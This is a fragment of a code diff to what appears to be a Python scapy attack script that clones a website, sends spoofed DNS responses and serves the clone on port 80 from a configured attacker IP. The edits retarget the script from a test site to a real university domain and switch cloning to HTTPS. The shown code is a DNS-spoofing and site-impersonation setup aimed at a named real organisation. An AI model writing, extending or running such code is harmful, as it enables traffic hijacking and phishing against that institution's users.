@@ -9,7 +9,7 @@ from scapy.all import *
 
 # Configuration
 attacker_ip = "192.168.2.2"  # Replace with your actual IP address
-target_domain = "httpforever.com"
+target_domain = "xsite.singaporetech.edu.sg"
 cloned_site_dir = "cloned_site"
 
 # Function to clone the website
@@ -68,7 +68,7 @@ def dns_spoof(pkt):
             print(f"Sent spoofed DNS response to {pkt[IP].src}")
 
 # Clone the website
-clone_website(f"http://{target_domain}", cloned_site_dir)
+clone_website(f"https://{target_domain}", cloned_site_dir)
 
 # Start the web server in a separate thread
 web_server_thread = Thread(target=start_web_server, args=(80, cloned_site_dir))
